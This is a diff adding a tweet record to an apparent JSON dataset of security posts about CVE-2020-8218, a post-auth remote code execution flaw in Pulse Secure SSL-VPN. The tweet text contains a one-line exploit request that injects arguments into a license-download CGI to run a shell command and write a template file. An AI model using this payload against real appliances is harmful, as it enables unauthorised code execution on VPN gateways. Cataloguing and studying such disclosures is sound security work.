@@ -28,6 +28,19 @@
     "expanded_url": [
         "https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/"
     ],
+    "tweetfavorites": 319,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 142,
+    "tweettext": "CVE-2020-8218 : Pulse Secure SSL-VPN post-auth RCE\nCc @chybeta\n\nhxxps://x.x.x.x/dana-admin/license/downloadlicenses.cgi?cmd=download&amp;txtVLSAuthCode=whatever -n '($x=\"ls /\",system$x); #' -e /data/runtime/tmp/tt/setcookie.thtml.ttc\n\nhttps://t.co/okL58FZVJU https://t.co/OGxySMF4SM",
+    "tweettime": "2020-08-29, 10:30:52",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1299655751758221319",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/"
+    ],
     "tweetfavorites": 367,
     "tweetquotes": 6,
     "tweetreplies": 1,
